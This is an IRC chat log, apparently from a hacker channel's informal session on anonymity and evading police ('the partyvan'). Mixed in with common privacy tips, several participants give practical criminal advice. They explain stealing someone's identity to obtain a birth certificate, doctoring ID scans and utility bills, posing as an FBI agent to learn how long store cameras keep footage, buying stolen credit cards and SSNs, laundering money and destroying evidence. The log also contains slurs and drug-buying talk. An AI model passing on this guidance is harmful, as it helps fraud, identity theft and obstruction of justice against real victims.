01:03 <+Kayel> Just to chip in, the dudes from ThePirateBay recommend https://www.ipredator.se, and they also advertise it :).
01:03 <@xo> i use swissvpn
01:03 <@xo> is gud
01:03 <+YmxldnB4> firefox addons like https anywhere are a must anyways
01:03 <@m4tr1c3s> you should use https all the time anyway
01:03 <@m4tr1c3s> swissvpn is amazing, I love it
01:03 <+Zombietrap> So we've covered not letting your browser shit the bed for you (TOR) and not being a retard (asshole VPNs)
01:03 <+Zombietrap> What is with these foxinsocks's?
01:03 <+FR0STY> swissvpn is a fag :(
01:03 <+Zombietrap> there's so fucking many
01:03 <@hatter> they're from some site
01:03 <&Fox> Yep
01:03 <+YmxldnB4> also vpn payments might be tracable
01:03 <@hatter> people browsin
01:03 <@hatter> a site
01:03 <@xo> so
01:03 <@xo> now
01:04 <@xo> the obvious
01:04 <@hatter> in webchat
01:04 <@xo> DONT FUCKING LEAK PERSONAL INFO
01:04 <@xo> it adds up
01:04 <@hatter> ^
01:04 <+Zombietrap> ^
01:04 <@xo> little bits of info which alone are useless
01:04 <@xo> can be put together
01:04 <@xo> to make something bigger
01:04 <+YmxldnB4> ^
01:04 <+Zombietrap> One piece of info does not a dox make
01:04 <@xo> its like data mining
01:04 <+Zombietrap> this is
01:04 <+Zombietrap> a LIE
01:04 <+Zombietrap> The smallest shit
01:04 <@xo> spread disinformation
01:04 <@xo> throw people off
01:04 <+Zombietrap> a username, even a photo
01:04 <+YmxldnB4> Zombietrap: all pieces of info do a dox make
01:04 <@m4tr1c3s> stuff like, oh it's late, time for bed == timezone
01:04 <+Zombietrap> no, you never get all the pieces right off the dick
01:05 <+Zombietrap> You start with one piece, usually
01:05 <+Zombietrap> say I've got your picture, straight from your iphone
01:05 <@xo> some stuff is unavoidable
01:05 <@xo> unless youre really dedicated
01:05 <@m4tr1c3s> spread disinfo, say you're going to work when you're actually going to bed, imply you do something other than what you do, if you're american use english spellings (like colour)
01:05 <@xo> like, if youre from the US, people outside US are probably going to be able to tell
01:05 <+YmxldnB4> Zombietrap: geotag
01:05 <@xo> someone pmd me today
01:05 <@xo> just from how u talk
01:05 <@xo> asking why fox kept saying "werd"
01:05 <+YmxldnB4> "u" is pretty american too
01:05 <+Am0s> I always assume I am being logged by at least one fed when on Anonops. For this reason, NEVER directly state your country. Leave room for plausible deniability. Never mention things like pets or relationships, as unimportant as you may believe them to be. Only say these things if they are disinformation, becasue every bit adds up to a van outside
01:05 <@xo> the way you speak will give away where youre from. UK people are easy to spot, because they use UK slang
01:06 <+Zombietrap> Not just that, but I've got (if you were in the image) your face, your clothing to recognize you, one of your interests, and I can find this image anywhere else it's posted.
01:06 <&Fox> Werd.
01:06 <@xo> werd.
01:06 <+Zombietrap> But getting back on hand
01:06 <+Zombietrap> NOT GETTING VANNED
01:06 <@m4tr1c3s> "twat", "bollocks", "sod off"
01:06 <@xo> ^
01:06 <@xo> 'mint'
01:06 <@m4tr1c3s> lol
01:06 <@xo> is the one i see a lot
01:06 <@xo> or mate
01:06 <@xo> u know
01:06 <@xo> so i mean, shit like that
01:06 <@m4tr1c3s> although that can be aus etc
01:06 <@xo> unless youre like
01:06 <@xo> really assuming a new ident
01:07 <@xo> and realy dedicated to it
01:07 <@xo> people will know
01:07 <@xo> if you speak shitty english, everyone will know youre a foreigner
01:07 <@xo> the reverse is true as well
01:07 <+Zombietrap> A good way to test this is to go back to a place you frequent
01:07 <+Zombietrap> an irc channel, etc
01:07 <+Zombietrap> with a new name
01:07 <+Zombietrap> And don't get caught
01:07 <+Zombietrap> Watch everything. you. say.
01:08 <@xo> its hard
01:08 <@xo> really hard
01:08 <@xo> people, even stupid people
01:08 <@xo> are smart that way
01:08 <@xo> you pick up on things
01:08 <+Zombietrap> Humans are trained to pick up subtle cues that way
01:08 <@m4tr1c3s> basic shit: make sure your handle isn't the same one you use for your wow account, or your twitter -.-
01:08 <@xo> plus
01:08 <@xo> internet people
01:08 <@xo> are NOID AS FK
01:08 <+Zombietrap> holy shit, yes
01:09 <@xo> like im p sure Zombietrap and m4tr1c3s and xo are the same person
01:09 <@m4tr1c3s> lol
01:09 <@xo> but idk
01:09 <+Zombietrap> lol
01:09 <@m4tr1c3s> shutup xo
01:09 <+Am0s> also, as it was mentioned indirectly, it is important to change your identity every now and then. for example, I will not always be Am0s. I may change it to something related like M@l@ch1 if I feel risky, but a smart thing is to keep them totally different.
01:09 <@xo> nou
01:09 <@m4tr1c3s> they'll figure it out
01:09 <@xo> well
01:09 <@xo> theres disadvantages to doing that, Am0s 
01:09 <+YmxldnB4> http://kpvz7ki2v5agwt35.onion/wiki/index.php/Security_and_Encryption_FAQ
01:09 <+Am0s> like?
01:09 <@xo> you cant just reappear all the places u used to be under a new nick
01:10 <@xo> and pick up where u left off
01:10 <@xo> you lose something
01:10 <+Zombietrap> You lose whatever credibility you have
01:10 <@xo> in a change like that
01:10 <@m4tr1c3s> you lose contacs
01:10 <@xo> exactly
01:10 <@xo> ofc in a switch
01:10 <@xo> youd tell a few close people
01:10 <@xo> but you cant tell more than that w/o defeating the purpose
01:10 <@m4tr1c3s> email is the best way
01:10 <+Zombietrap> mhm
01:10 <@m4tr1c3s> when you switch, email your close contacts to inform them
01:10 <+Am0s> yes, you lose credibility, but at times it is neccessary. (ex: You will never see No, Mercedes, or Topiary again i am sure)
01:10 <+Zombietrap> That way you don't waste years of social engineering or whatever
01:11 <@m4tr1c3s> example of paranoia:
01:11 <+r00t00r> (ty) 
01:11 <@m4tr1c3s> when canthack.us went down, we got our hands on the drama with Fox
01:11 <@m4tr1c3s> and we were 90% sure it was scripted
01:11 <@m4tr1c3s> as disinfo
01:11 <&Fox> BIG HECKERS CHILL IN #SCHOOL
01:11 <@m4tr1c3s> and Fox would be back under a new handle
01:12 <@m4tr1c3s> lol
01:12 <+Zombietrap> <Fox> BIG HECKERS CHILL IN #SCHOOL
01:12 <+Zombietrap> aowufe
01:12 <&Fox> m4tr1c3s: 
01:12 <&Fox> Are you sure it was?
01:12 <&Fox> Or was it?
01:12 <&Fox> Am I the real fox?
01:12 <&Fox> was that the real fox at defcon?
01:12 <&Fox> So many questions :)
01:12 <@m4tr1c3s> or are there so many questions?
01:12 <@m4tr1c3s> OK OK I AM THE JESTER JUST LEAVE ME ALONE
01:12 <+YmxldnB4> why are there so many questions?
01:12 <&Fox> Lol
01:13 <&Fox> Alright
01:13 <&Fox> so is it time for avoiding the partyvan yet?
01:13 <@xo> step 1
01:13 <@xo> cover yourself in baby oil
01:13 <@xo> this way its hard for them to hold on to
01:13 <@xo> u
01:13 <+Am0s> lol
01:13 <@xo> only tighty whiteys
01:13 <@xo> and baby oil
01:13 <@xo> when the feds come
01:13 <@m4tr1c3s> Fox's guide on avoiding the party van: get drunk, show up at defcon and dox yourself
01:13 <&selket> whos amos
01:13 <+YmxldnB4> step 2. confuse, for example, run on the street naked
01:13 <@m4tr1c3s> :p
01:13 <@Hellspawn> Step 2: Buy a hot air balloon and hack from there.
01:13 <&selket> dont talk about my girl :(
01:13 <+Zombietrap> xo no
01:13 <+Zombietrap> panties
01:13 <@xo> yus
01:13 <@xo> panties
01:13 <@xo> theyre lighter
01:13 <@xo> so u can run faster
01:14 <+Zombietrap> they don't have that flap in the front
01:14 <+Zombietrap> they can't catch you by your dick
01:14 <&Fox> Lol
01:14 <&Fox> Alright
01:14 <@xo> look
01:14 <@xo> why do i not have sop
01:14 <@xo> ok
01:14 <@xo> ?
01:14 <&selket> and you told ME not to troll
01:14 <+Zombietrap> >hacking
01:14 <@m4tr1c3s> lol
01:14 <&Fox> Fox's guide for avoiding the partyvan
01:14 <@xo> hacking is illegal
01:14 <&Fox> Shut the fuck up
01:14 <@xo> i dont do it
01:14 <&Fox> or i start Kbing
01:14 <@xo> you shouldnt either
01:14 <&selket> xo ask acid
01:14 <@xo> meh
01:14 <~Terminal> ^^
01:14 <&Fox> Anyways,
01:14 <@xo> id rather just whine until someone else does
01:14 <&Fox> moving on
01:15 <&Fox> The partyvan is a fickle thing
01:15 <&Fox> we've obviously covered anonymity when you do dirt
01:15 <+Kayel> Pardon me, was SSH covered?
01:15 <&Fox> public places, public wifi, mac changers and shit
01:15 <&Fox> Kayel: shush
01:15 <&Fox> Anyways, 
01:15 <+Zombietrap> Mac changers, mind outlining that briefly?
01:15 <&Fox> Yes I do right now
01:15 <&Fox> google it.
01:15 <&Fox> or look in prior talks
01:15 <&Fox> Now the partyvan is a fickle thing
01:15 <@xo> its pretty straight forward
01:16 <@xo> just make an init script
01:16 <&Fox> In order to really get an idea 
01:16 <@xo> to run macchanger when u boot up
01:16 <&Fox> of what you're fucking handling
01:16 <&Fox> An ear to the scene is always good
01:16 <&Fox> snitches brag
01:16 <&Fox> pretty much always
01:16 <&Fox> You will hear rumour of who's getting looked at
01:16 <&Fox> who had a box picked up
01:16 <&Fox> who's associated with you
01:16 <&Fox> plenty of things
01:16 <@xo> ^^^^
01:16 <@xo> this
01:16 <&Fox> all of these are a good barometer to find out if you're about to be next
01:17 <&Fox> Now
01:17 <&Fox> We've talked about VMs
01:17 <&Fox> SD Cards 
01:17 <+Cookiie> So guys, what are you teaching?
01:17 <&Fox> all sorts
01:17 <&Fox> The big thing, is that if you DONT WANT TO BE HIT
01:17 <&Fox> You have to be willing to go on a moments notice
01:18 <&Fox> before they can hit you
01:18 <&Fox> there will be false alarms
01:18 <&Fox> it will not be fun
01:18 <@xo> ^
01:18 <@xo> huge understatement
01:18 <&Fox> it will be a lot of moving, and a lot of emotional detachment from people you care about
01:18 <@xo> IT WILL BE A FUCKING STRESSY PAIN IN THE ASS
01:18 <+turbopinko> YOU CANT CALL YOUR MOMS FOR HELP
01:18 <&xo> k
01:18 <&Fox> It is enough to destroy you
01:19 <&Fox> turbopinko: 
01:19 <&Fox> You bring up a good point
01:19 <&Fox> going wildcard
01:19 <&Fox> You lose everyone in life.
01:19 <&Fox> Everyone you know
01:19 <&Fox> is a liability.
01:19 <&Fox> You are on your own, left only with anything anonymous you have
01:19 <&Fox> the cash in your pocket
01:19 <&Fox> and the non-tracable assets in your possession
01:19 <&Fox> it isn't fun
01:19 <&xo> keepin money in e-gold
01:19 <&xo> is gud idea
01:19 <&Fox> People will dig for you
01:19 <+Zombietrap> ugh must not make ICP joke
01:19 <&Fox> People will literally fucking hunt you
01:20 <&Daniel_Brandt> IM COMIN AFTER U FOX
01:20 <&Fox> Anyways
01:20 <+YmxldnB4> "Use the force, Harry!" - Gandalf
01:20 <+FR0STY> fox
01:20 <&Fox> What
01:20 <+YmxldnB4> Daniel_Brandt: bitcoins
01:20 <+FR0STY> if you are gonna lose your family and shit anyway
01:20 <&xo> fk bitcoins
01:20 <&xo> i mean
01:20 <+YmxldnB4> xo: bitcoins are a good idea
01:20 <&xo> bitcoins are cool
01:20 <&Fox> Shitty hotels are your friend.
01:20 <&xo> but not stable
01:21 <&Fox> No-Tell-Motels are the best.
01:21 <@m4tr1c3s> xo, what do you advise
01:21 <@m4tr1c3s> for e-currency
01:21 <&Fox> If not, make up bullshit to the hotel about losing your wallet and having cash
01:21 <&xo> pecunix
01:21 <+FR0STY> why don't you change "identity" before you even risk to lose it, so you aren't forced to ghost out of your real life anyway
01:21 <&xo> or LR
01:21 <+YmxldnB4> xo: e-gold is centralised, they could track you
01:21 <&xo> WMZ if u must
01:21 <&xo> YmxldnB4: centralized in another country
01:21 <&Fox> FR0STY: Because, if you were doing that you wouldnt need this talk
01:21 <&xo> and it goes through an excahnger
01:21 <&xo> to get to u
01:21 <&xo> using a fake name
01:21 <+Am0s> Fox at what point do you believe it to be necessary to take up the vagrant constant-motion lifestyle?
01:21 <+YmxldnB4> bitcoin has not gotten under $10 since it went above it
01:21 <&xo> realistically
01:21 <&xo> theyre not guna track shit
01:21 <&Fox> Am0s: At the time the wagons start to circle.
01:21 <+YmxldnB4> ok it has, it was at 7, but still
01:22 <+YmxldnB4> #5.
01:22 <+YmxldnB4> $5.
01:22 <&Fox> When there is a taskforce dedicated to you
01:22 <&xo> it was $30
01:22 <&xo> like a month ago
01:22 <&xo> i hope it stabilizes
01:22 <&xo> cryptocurrency
01:22 <&xo> fucking COOL
01:22 <&xo> i love it
01:22 <&xo> but not stable neough to rely on
01:22 <&Fox> is my point where I move
01:22 <&Fox> Others are different
01:22 <&Fox> But when someone is close to having an address
01:22 <&Fox> it's time to jet.
01:22 <+YmxldnB4> xo: 2 months. it crashed to 20 then
01:22 <&Fox> I've lived in over 20 cities over the years.
01:22 <+YmxldnB4> and now to 10
01:22 <+FR0STY> how you know they are near to?
01:23 <&Fox> I have a lot of friends.
01:23 <+YmxldnB4> new challenge! new challenge! :P
01:23 <&Fox> Xo
01:23 <&Fox> go ahead.
01:23 <&xo> ive lived in 21 cities
01:23 <&Fox> I'm out right now.
01:23 <&xo> fuck
01:23 <&xo> UHHHHHHHHHHHHHHHH
01:23 <&Fox> Just out of steam at the moment
01:23 <&xo> leme get another beer
01:23 <@m4tr1c3s> in the meantime, questions and discussion about anonymity?
01:24 <&xo> ok
01:24 <&xo> back
01:24 <@m4tr1c3s> nvm
01:24 <&xo> the tl;dr
01:24 <&xo> of this talk is
01:24 <+YmxldnB4> that was fast :D
01:24 <@m4tr1c3s> lol
01:24 <&xo> theres no such things are real anon
01:24 <&xo> its just a matter of how hard it is
01:24 <&xo> for them to track u down
01:24 <@AnonGuest17965> pm FoxInSocks232 
01:24 <@AnonGuest17965> i mean fox
01:24 <&xo> u just wanna make it prohibitively difficult
01:24 <+daemon> is it better to steal, or create Identety
01:24 <+daemon> ??
01:24 <&xo> depends whta youre doing
01:24 <&xo> if u just wanna appear as someone else online
01:24 <+Am0s> there is always a way to track somebody. Just be a pain in the LEO's arsch along the way
01:24 <&xo> no need to risk ident theft
01:24 <@Hellspawn> short term = steal
01:24 <+YmxldnB4> daemon: create can not be found out
01:24 <@Hellspawn> long term = create
01:24 <&xo> if u anna like
01:24 <@m4tr1c3s> ^^
01:24 <&xo> open bank accounts
01:24 <+YmxldnB4> or harder
01:24 <&xo> and lines of credit
01:24 <&xo> and get jobs
01:24 <&xo> in the name
01:25 <&xo> u gotta go balls deep
01:25 <+YmxldnB4> steal and someone might counterclaim
01:25 <+Kayel> ukash is for anonymous online payments
01:25 <+Kayel> Trouble is, not many support it :/
01:25 <&xo> LR
01:25 <&xo> and
01:25 <&xo> pecunix
01:25 <+Kayel> If you're gonna buy a VPN, use ukash
01:25 <&xo> why ukash?
01:25 <&xo> why do u prefer it?
01:25 <&xo> no one takes it, no exchangers even seem to accept it
01:25 <@m4tr1c3s> ^
01:25 <@m4tr1c3s> that's the problem
01:26 <+sandstone> buy prepaid ccs with cash
01:26 <&xo> liberty reserve and pecunix
01:26 <+Kayel> ukash is anonymous
01:26 <@m4tr1c3s> good idea is to pay for a prepaid credit card with cybermoney
01:26 <&xo> pecunix is interesting because its locked to the price of gold
01:26 <&xo> Kayel: so its all e-gold
01:26 <@m4tr1c3s> yeh sandstone
01:26 <&xo> if you do it rihg
01:26 <&xo> right*
01:26 <&xo> once its acquired
01:26 <&xo> its anon
01:26 <&xo> if you acquire it anonymously
01:26 <&xo> youre in business
01:26 <+sandstone> call the store manager with a throwaway phone pretending you are an fbi agent investigating a crime and asking how long they retain their camera footage
01:26 <&xo> what?
01:26 <+sandstone> when buying dirty prepaid cards ^
01:26 <&xo> ohhh
01:26 <@m4tr1c3s> fbi?
01:26 <+sandstone> when the are activated, they are tied to a particular location
01:27 <&xo> they have no way to know where it was sent from afaik
01:27 <&xo> well
01:27 <@m4tr1c3s> PI is proably better
01:27 <&xo> bought from
01:27 <&xo> PI is better
01:27 <+sandstone> they might not reveal it
01:27 <&xo> cause u dont need creds to beack it up
01:27 <&xo> FBI they might ask for badge # etc
01:27 <&Fox> vanilla visas
01:27 <&Fox> et cetera
01:27 <+sandstone> it's over the phone, they won't question, if they do hang up and call someone else
01:27 <&xo> WESTERN
01:27 <&xo> FUCKING
01:27 <&xo> UNION
01:27 <&xo> easiest way to send money anon
01:27 <+sandstone> western union is limited to 1k w/o id
01:27 <+Am0s> And impersonating a federal officer is not going to work in your favour i nthe end...
01:27 <&xo> they dont card u to send money
01:27 <&xo> under 1k
01:27 <&xo> or recieve under 1k
01:27 <&xo> w/ a question
01:27 <+sandstone> if you are sending less than 1k nobody is gonna bother with you anyway
01:27 <&xo> some exchangers will ask for ID
01:27 <&xo> a photoshopped util bill
01:27 <&xo> will do sometimes
01:28 <&xo> or just scan a fake id
01:28 <+sandstone> (authority figures anyway)
01:28 <&xo> since youre just sending scans
01:28 <&xo> its p easy to doctor up whatever u need in photoshop
01:28 <@m4tr1c3s> for more on this, check out Fox and xo's class on conning 
01:28 <&xo> i was part of that?
01:28 <&xo> thats whack
01:29 <&xo> ok
01:29 <@m4tr1c3s> lol
01:29 <+FR0STY> xo, i do i get a "fake" ssn ?
01:29 <&xo> "fake" meaning, someone elses?
01:29 <+FR0STY> guess so
01:29 <&xo> if you can get their drivers lic
01:29 <&xo> and you know where they were born
01:29 <&xo> u can use scans to get a birth cert
01:29 <&xo> in a small state, its not hard to figure out the hospital they were born in
01:30 <+FR0STY> wouldn't be easier to buy one?
01:30 <&xo> it would be
01:30 <&xo> i figured id just mention that
01:30 <&xo> if the answer was
01:30 <&xo> JUST B8UY IT
01:30 <+sandstone> only worry with that is if you bought it from somebody on undernet it's probably been sold 5 times before
01:30 <+FR0STY> which leads to, how/where we can buy one?
01:30 <+daemon> its nice to read steal this book
01:30 <&xo> it wouldnt be a very interesting question
01:30 <&xo> FR0STY: irc
01:30 <&xo> lol
01:30 <&xo> or there are sites setup
01:30 <&xo> to sell shit like that
01:30 <+YmxldnB4> silk road
01:30 <&xo> no SR
01:31 <&xo> not*
01:31 <&xo> i meant sites
01:31 <&xo> specifically
01:31 <&Fox> REPUTATION REPUTATION REPUTATION
01:31 <&xo> for CCs
01:31 <&Fox> REPUTATION REPUTATION REPUTATION
01:31 <&xo> and shit
01:31 <&Fox> REPUTATION REPUTATION REPUTATION
01:31 <&xo> ^
01:31 <+YmxldnB4> xo: I meant silk road market
01:31 <&xo> its all about
01:31 <&xo> knowin people
01:31 <@m4tr1c3s> this is where contacts are important
01:31 <&xo> YmxldnB4: i know what u mean
01:31 <@AnonGuest17965> Fox: 
01:31 <@AnonGuest17965> MSG MSG MSG
01:31 <+YmxldnB4> xo: no the internet site
01:31 <&xo> im saying, that site doesnt have a lot of poeple interested in that

01:31 <@AnonGuest17965> MSG MSG MSG MSG MSG MSG :P
01:31 <&xo> IM NOT STUPID

01:31 <&xo> yeah
01:31 <+YmxldnB4> (or so I've been told)
01:32 <&xo> i wouldnt trust sellers of ccs there
01:32 <&xo> and i dount think you could sell much
01:32 <&xo> there
01:32 <&xo> tbh
01:32 <&xo> people go there for drugs
01:32 <&xo> not for validz
01:32 <+sandstone> I concur, sr is bad for sellin that
01:32 <&xo> someone should setup a site like that
01:32 <&xo> for validz
01:32 <+sandstone> good for quality droogs though
01:32 <&xo> some exist
01:32 <&xo> but not public
01:32 <&xo> afaik
01:32 <&xo> sandstone: pricey
01:32 <&xo> imo
01:32 <&xo> i dont wanna pay $15 for a hit of acid lol
01:33 <@m4tr1c3s> lol
01:33 <+sandstone> no but i'll pay 60 a g for 90+ blow
01:33 <+sandstone> but moving on
01:33 <&xo> idk never bought there, just poked around, prices were higher than what i pay for most things
01:33 <+sandstone> its down anyway
01:33 <&xo> o?
01:33 <&xo> FEDS CATCH EM?
01:33 <&xo> Lulz
01:34 <+sandstone> yeah, they had an outage, came back up said "no attack etc etc just power outage working on a solution to prevent gonna stay down for a few days though"
01:34 <+YmxldnB4> sandstone: they returned
01:34 <+sandstone> ^^
01:34 <+YmxldnB4> sandstone: the down page is still up
01:34 <+YmxldnB4> let me check
01:36 <+YmxldnB4> it's up
01:36 <&Fox> Ok kids
01:36 <&Fox> so that talk died out
01:36 <+YmxldnB4> look at the hidden wiki, it has a couple of links
01:36 <&Fox> Sup
01:36 < baWs3> so what is the first thing you should doo when the vans pull up
01:36 < Sl0xX> for instance, always remember to transact from personal credit card, go a county over to a grocery store and purchase prepaid or greendot even
01:36 < FoxInSocks750> So what's happening then
01:37 <&Fox> Sl0xX: are you fucking retarded
01:37 <&Fox> CASH
01:37 <&Fox> CASH
01:37 <&Fox> CASH
01:37 <&Fox> CASH
01:37 <&Fox> I can trace that shit.
01:37 < iextazy> from a store with no cams
01:37 <&Fox> your credit card.
01:37 <&Fox> jesuschrist
01:37 <+YmxldnB4> Fox: prepaid credit cards
01:37 < Sl0xX> lol maybe you werent listening. sry
01:37 <&Fox> Yes talking about prepaids.
01:37 < Kiwi> No one mentioned drop phones lol.
01:37 <&Fox> baWs3: Destroy evidence.
01:38 < Sl0xX> take money and buy prepaid
01:38 <&Fox> Kiwi: 
01:38 <&Fox> Non-Traceable items
01:38 < Sl0xX> what u gonna trace?
01:38 < baWs3> then get out of dodge
01:38 < Zombietrap> so
01:38 <&Fox> Phone kind of falls into
01:38 <&Fox> Non-Traceable items
01:38 <&Fox> ****
01:38 <&Fox> TRACEABLE
01:38 < Kiwi> Sot of....
01:38 <&Fox> TRACEABLE ITEMS
01:38 <&Fox> lol
01:38 <+Am0s> baws3: microwave any USB drives associated. Boot and nuke computer if not encrypted (IUTT SHOULD BE!)
01:38 < Kiwi> sort of ..
01:38 < Zombietrap> It was literally 2 days ago that I used a drop visa that had NO ties to me whatsoever
01:38 < Zombietrap> It's dirt fucking easy
01:38 < Kiwi> Keep in faraday cage
01:38 < Sl0xX> Fox, how do you trace prepaid?
01:38 < Kiwi> except in busy plaza
01:38 <&Fox> Kiwi: That's a possibility.
01:38 < baWs3> assuming all that has been done.. take off or try your luck
01:39 < towq> csi miami style
01:39 < Zombietrap> No ties except the cam that saw me buying it
01:39 <&Fox> Sl0xX: Busy areas. Burner off, battery out, faraday if available.
01:39 < AnonGato> faraday?
01:39 < towq> so what happens when they ask you for your id when you want to get the prepaid card
01:39 <&Fox> Fuck that place
01:39 <+YmxldnB4> towq: they do not
01:39 <&Fox> they're fags.
01:39 < Zombietrap> dade murphy get out
01:39 < FoxInSocks499> hey
01:39 <+Am0s> baWs3 I say try your luck or risk resisting arrest charges, but i assume it depends upon your location and situationn
01:39 < fdsfdskjgfnlsd> can you clean money over bitcoin?
01:39 < Sl0xX> lol never been asked for id for a drop card
01:40 <+YmxldnB4> fdsfdskjgfnlsd: bitcoins tracable
01:40 < Kiwi> Not with tor
01:40 <+YmxldnB4> all transactions are public
01:40 <+YmxldnB4> your money is tracable
01:40 <+sandstone> lol who asks for ids for cards
01:40 < Kiwi> Not when there is no ip associated with the transaction, or other discernable data
01:40 < towq> or you could just throw the money around acouple thousand wallets
01:40 <&Fox> Kiwi: IPs are almost always associated
01:40 <+YmxldnB4> Kiwi: they'll figure out where the coins came from
01:40 < Zombietrap> They won't ask for an ID
01:40  * Kiwi balls on some crypto currency
01:41 <&Fox> But VPN or Tor IPs = Anonymous-ish enough
01:41 < FoxInSocks499> follow me @PatrickWNewsom
01:41 < Kiwi> Fox: they gonna pull _my_ id from _my_ tor setup? ;3
01:41 <&Fox> MAYBE.
01:41 < Zombietrap> Usually, it's literally just "How much do you want on it?" "Here's your activation code" or something like that
01:41 < Sl0xX> Zombie, thats always been my experience
01:42 < towq> tor has enough pedos to warrant gov take over
01:42 <+YmxldnB4> freenet is worse
01:42 < FoxInSocks868> Tor thought a VPN through a 3g modem brought anonymously = Traceable or not?
01:42 < Kiwi> Bitcoin is as good as a file, it is as anonymous as you make the transactions
01:42 <&xo> couple thousand allets
01:42 <&xo> wallets
01:42 <&xo> would take ages
01:42 <&xo> it takes time to verify transactions
01:42 < Sl0xX> hell, I could even get someone else to buy it.... trace that lulz
01:42 <&xo> on the btc network
01:42 <+sandstone> heres the real bit: encrypt your shit, use a good vpn or tor, and then stop worrying so much.  I can damn near guarantee you that you are not that important that any leo is going to huge efforts to catch you for hacking somebodies blog and putting a guy fawkes mask on all her cat pictures
01:42 <+YmxldnB4> FoxInSocks868: you'll need a 3g provider
01:42 < fdsfdskjgfnlsd> so why is there any need vor a debit cashout card? if you can clean you money over bitcoin?
01:42 < ES> lol @ cat pics
01:42 < Zombietrap> Now, I'm (at the moment) installing ubu, followed by a mac changer, on a vm. After that, I'll install Tor, and keep a list of VPNs handy. This is good, yeah?
01:42 < zeitgh0st> And if it's a compromised tor exit node, they can watch your data
01:43 < Zombietrap> In lieu of a second laptop
01:43 <@m4tr1c3s> well, for day-to-day I just use heavily secured firefox, https and vpn
01:43 <+sandstone> and if it really comes to it
01:43 <+sandstone> http://xkcd.com/538/
01:43 <+YmxldnB4> someone should give some kind of talk
01:43 <+Am0s> sandstone: people wanted Worst case scenarios, we gave them worst case scenarios
01:43 < towq> wouldn't say a public vpn or proxy is secure at all
01:43 <&xo> HMMMMOKTALKS
01:43 <&xo> I had an idea
01:43 < towq> if anything theyre less secure than nothing
01:43 <&xo> what was it
01:43 <&xo> ffff
01:43 <@m4tr1c3s> free vpn = worthless
01:43 < zeitgh0st> sandstone: heh, that's a good one
01:43 <&xo> uhh uhh uhhhhhh uhhh uhh
01:44 <&Fox> Free VPN's are shit.
01:44 <@ErrProne> *cough* amazon
01:44 <&Fox> So, next topic.
01:44 <+turbopinko> python!!
01:44 < towq> no
01:44 <&xo> FUCK
01:44 <&xo> I cant remember
01:44 < S4NDALPHON> may i say that it is heavily simplified to say that exit nodes can see what you browse ?
01:44 <&Fox> Ok guys, should I twitter summon Hatter?
01:45 < Zombietrap> Yes
01:45 < baWs3> you can sniff an exit node
01:45 <@m4tr1c3s> hatter has twitter?
01:45 <&Fox> Sec.
01:45 <&xo> oh
01:45 < towq> well if there are two compromised exit nodes and you jsut happen to the 2/3
01:45 <&xo> Fox: 
01:45 <&Fox> HATTER HAS A TWITTER
01:45 <&xo> i can talk about
01:45 <&xo> string format vulns
01:45 < towq> then they can decrypt everything
01:45 <&xo> for like 10 min
01:45 <@m4tr1c3s> FUCK I MUST HAVE IT
01:45 < Zombietrap> Hatter is a rad chap
01:45 <&xo> lol
01:45 <+YmxldnB4> xo: all in the shellcoders handbook
01:45 <+Am0s> heh, xkcd.org today is relevant to anons
01:45 < FoxInSocks868> moar guides 4 free pr0m
01:45 <&Fox> Please check the twitter.
01:46 <&Fox> @blackhatacademy
01:46 <&Fox> Look
01:46 <&Fox> and summon hatter
01:46 <&Fox> He may come!
01:46 <@m4tr1c3s> nyeh, found it
01:46 < FoxInSocks771> lulzors
01:46 < Frosty> http://xkcd.com/936/
01:46 < Frosty> ^
01:46 < towq> looks legit mr frosty
01:46 < S4NDALPHON> from what i've heard, to TOR is like me >> encrypted data >> node -decode- reencrypt >> encrypted data and so on to the final exit node that will reach the dest.ip and retrieve data from server
01:47 < S4NDALPHON> am i wrong ?
01:47 <+YmxldnB4> Frosty: vuln to dict attacks
01:47 <+YmxldnB4> S4NDALPHON: yes
01:47 < baWs3> tor is slow as hell
01:47 <&xo> everyone
01:47 <&xo> use your hatter call
01:47 < Zombietrap> I only have one twitter
01:47 < Zombietrap> :I
01:47 <+YmxldnB4> S4NDALPHON: it's like encrypt >> encrypt >> encrypt >> node -decode- >> node -decode- >> node-decode- >> detination
01:47 < FoxInSocks771> wait towq you think what frosty put was legit??
01:47 <+YmxldnB4> destination*
01:48 < towq> yes i am a very serious person
01:48 <+YmxldnB4> FoxInSocks771: vulnerable to dictionary attacks
01:48 < Frosty> YmxldnB4
01:48 < FoxInSocks771> oh okay
01:48 <&xo> I AM VERY SARUS
01:48 <&xo> U GUISE
01:48 <&xo> so
01:48 <&xo> hat u wanna hear about?
01:48 <&xo> idc if we've done it already
01:48 < Frosty> do you dictionary 4 words? ye? add a !
01:48 <&xo> theres new people
01:48 <+YmxldnB4> xo: super serial.
01:48 <&xo> YA
01:49 < FoxInSocks868> DOOOOOOOOOOOD WTF is this learning, I am not learning here
01:49 < baWs3> creating fake id 
01:49 <&Fox> WHAT DO YOU WANT TO LEARN TEHN CUNT
01:49 <+YmxldnB4> xo: go talk about buffer overflow attacks
01:49 <&Fox> Hmmm
01:49 < towq> how to make stupid people disappear
01:49 <&Fox> Fake IDs could be a good topic
01:49 < S4NDALPHON> YmxldnB4: yes,  so how would the exit-node  have what it needs to break encryption from previous nodes ?
01:49 <+YmxldnB4> *catface voice* yes. do that.
01:49 < MacGyverr> how about
01:49 < Zombietrap> lol towq
01:49 < FoxInSocks868> I like how you say cunt, that makes you a real new zealander
01:49 < Zombietrap> This really has been all CYA
01:50 <%n0xmnky> i want to learn why Fox is such a cunt
01:50 <+Am0s> how to make stupid people disappear? Purchase a spade and a new rifle.
01:50 < peaceChic> Ok, so the baby oil is the best info I found here, other than CYA and encrypt and listent to the vibes
01:50 < MacGyverr> fabs thier security and valnuerabilities 
01:50 < baWs3> steal a rifle
01:50 < MacGyverr> seeing as everywhere you go they are being used
01:50 < Zombietrap> peace what about the panties
01:50 < baWs3> never purchase
01:50 <+YmxldnB4> S4NDALPHON: it only needs to break one layer of encryption, go read into public/private key cryptography to find out how the secure connection is set up
01:50 < peaceChic> Oh I have lots of tiny panties
01:50 <+YmxldnB4> is peaceChic a girl?
01:50 < anonstew> wpa2 hacking?
01:50 < Zombietrap> smdh
01:50 <&Fox> peaceChic: God save you.
01:51 < towq> how to be a pro hacker: dl nmap, netbus, subseven, and sshnuke
01:51 < towq> there u go
01:51 < baWs3> there are no girls on the interweb
01:51 <+YmxldnB4> towq: trololol
01:51 < Nordral> Hello
01:51 <@ErrProne> sub7 win
01:51 <+daemon> can someone explain keysigning ?
01:51 < Zombietrap> lol towq
01:51 <@ErrProne> BO2k
01:51 <@ErrProne> win
01:51 <+Am0s> baws3 except in pr0n
01:51 < peaceChic> don't challenge my gender, I've fought this penis universe all my life.   :)
